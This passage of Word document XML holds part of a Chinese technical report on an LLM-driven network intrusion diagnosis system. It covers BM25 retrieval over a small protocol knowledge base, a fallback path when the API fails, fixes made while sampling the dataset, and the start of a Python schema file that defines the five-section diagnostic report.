        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这张截图里的报告是真实调用产生的，不是模板：底部标注“模型 deepseek-chat　耗时 4 933 ms”，正文 1 071 字，证据链里引用的“PSH Flag Count = 1.0，偏离训练分布 1.228 个标准差”直接来自 3.3.7 节的证据打包逻辑，处置建议里则出现了具体的网段与端口号。这几条细节说明它确实是“按给的证据写的”，而不是一篇通稿。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EA8B15">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.4.3 知识检索：为什么用 BM25 而不是向量库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443CB787">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>知识库只有 12 条协议知识（TCP 握手、SYN Flood、端口扫描、DoS Hulk、DDoS、暴力破解、Heartbleed、流特征语义、IAT 含义、误报、处置手册、抽样偏差），查询词就是固定的类别名加特征名。这个规模下向量检索并不比词面检索好，却要多装 torch、多下一个模型、多一个失效点；中文没有空格，按字切会把“端口扫描”切成四个没有意义的单字，所以用字符二元组。接口保持 retrieve(query, top_k)，将来要换向量库只需改 rag.py 一个文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A75B8B">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>检索结果取 Top-3 拼进提示词。之所以不是 Top-5 或更多，是因为知识库总共只有 12 条，取太多会把无关条目塞进上下文，反而稀释了真正相关的那一两条；而且大模型对提示词里“哪段是证据、哪段是背景”的分辨能力有限，越长越容易串台。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32954A48">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.4.4 降级路径与追问</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EF7413">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>降级路径也做了：没有配置 API key、或网络请求失败时，系统生成模板版报告并在界面上明确标注，服务本身不因此不可用。这个设计有实际收益——本机环境里 ALL_PROXY 写成 socks:// 时，httpx 在构造 Client 时就会抛异常，如果不在这一层兜住，整个诊断链路会连带把上报接口拖垮。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CFD1587">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>多轮追问复用同一套 schema：提问时携带上一轮的报告正文作为上下文，回答仍按五段落库，所以追问记录与首轮报告一样可检索、可导出。追问的设计意图是回答“换了前提会怎样”——例如“如果是内网主机被攻陷发起的，处置顺序有什么不同”，答案会重排处置建议的先后，而不是重复一遍报告。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6847F456">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.4.5 数据集构建</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632BEDFB">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>数据集抽样脚本按类配额抽取，并处理了两个必须处理的数据问题：一是原文件列名带前导空格（形如 ' Destination Port'），抽样时统一去掉，否则按下标取列会与按名取列得到不同结果；二是 Kaggle 镜像里三个 Web Attack 标签的 en dash 被上传者写坏成 U+FFFD（2 180 处，正好等于这三类的行数），它们不属于六类，抽取时已丢弃，labels.py 里的 normalize_label 对这两个字符做了兼容。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308BC8A1">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>此外脚本写了两列元数据：__source__ 记录每行来自哪个原始 CSV，用于按天的跨天评估；__order__ 是全局时间序号，按“天 → 文件内行号”递增（文件名字母序不等于时间序），用于按类内时间留出。这两列在训练时会被剔除（双下划线开头一律不作特征），但它们是把“按时间划分”这件事做对的前提。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8E6820">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.4.6 本部分完整代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BFEA6E3">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>以下为本部分全部代码。知识库 chunks.json 是结构化数据而不是程序，因此按字段拆成表 3-9 列出——每条的 id、标题、检索标签、正文与文件逐字段一致，直接读比读带转义的中文 JSON 更容易核对。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E75FA17">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-20　llm/schema.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（111 行）　M4 输出解析与校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072D3140">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M4 诊断报告的固定输出结构。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E5E874">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D7064A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>为什么要卡死 schema：报告要同时喂给看板、历史检索和多轮追问。模型偶尔换个标题、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F06C9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>少一段，前端就得写一堆兜底；更要紧的是"风险等级"这一栏如果不枚举，模型会自己发明</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4FE07E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"中高危"这种词，看板的颜色映射就静默失效。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139F0293">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122BFD63">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37F2B6DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133B7CF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0279D7F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF86D51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0FB986">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from dataclasses import asdict, dataclass, field</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A702AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C04C053">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>RISK_LEVELS = ["info", "low", "medium", "high", "critical"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488779D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="013E7D8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 五个固定部分的键名与中文标题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D3C802">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SECTIONS = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB05E8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "summary": "事件概述",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1031C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "risk": "风险等级",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44638A90">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "evidence": "证据链",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B306BF8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "actions": "处置建议",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8DCBE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "principle": "协议原理回顾",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7B0E5E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576A5F53">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="291867AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50449EFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@dataclass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4532D8DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class Diagnosis:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68150DBF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    summary: str = ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="579AD5A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    risk: str = "medium"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064DF3DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    evidence: list = field(default_factory=list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C511F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    actions: list = field(default_factory=list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136B0B21">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    principle: str = ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776E2C31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    category: str = ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539F974D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    confidence: float = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6DAA5C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4468D85E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def to_dict(self) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B039B0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return asdict(self)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47304067">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3148FC09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def to_markdown(self) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57735B7C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        risks = {"info": "提示", "low": "低", "medium": "中", "high": "高", "critical": "严重"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F501ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lines = [f"### {SECTIONS['summary']}", self.summary, ""]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEA8F23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lines += [f"### {SECTIONS['risk']}", f"**{risks.get(self.risk, self.risk)}**", ""]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1843E9E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lines += [f"### {SECTIONS['evidence']}"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0B7D33">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
